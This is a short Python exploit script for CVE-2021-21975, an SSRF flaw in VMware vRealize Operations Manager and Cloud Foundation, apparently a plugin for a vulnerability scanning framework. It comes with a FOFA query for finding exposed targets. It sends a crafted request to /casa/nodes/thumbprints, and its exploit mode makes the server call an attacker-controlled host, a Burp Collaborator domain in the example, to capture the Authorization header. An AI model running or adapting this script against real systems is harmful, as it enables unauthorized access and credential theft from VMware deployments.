#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='CVE-2021-21975'
AUTHOR="境心"
REMARK='VMware vRealize&Cloud Foundation SSRF漏洞'
FOFA_RULE='app="vmware-vRealize-Operations-Manager"'
######################################################

def ret_data(exp=None):
    if exp == None:
        data = '["127.0.0.1/admin/login.action"]'
        timeout = 5
    elif exp != None:
        data = '["%s"]' % exp
        timeout = 15
    return data,timeout

def _request(target,exp=None):
    url = target + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/json;charset=UTF-8"
    }
    data,timeout = ret_data(exp)
    res = requests.post(url, headers=headers, data=data, verify=False, timeout=timeout,proxies=proxies)
    return res,url

def poc(target,exp=None):
    result = {}
    res,url = _request(target,exp)
    if exp == None:
        if res.status_code == 200:
            result['poc'] = NAME
            result['poc_url'] = url
            result['message'] = '可能存在SSRF漏洞，请手工验证'
            return result
    elif exp != None:
        if res.status_code == 200:
            print('请到vps查看header中是否存在Authorization字段')


if __name__ == '__main__':
    # poc调用
    poc("https://127.0.0.1:443/","4sxpi8otjyj4w0shsthm0ibbn2tvhk.burpcollaborator.net")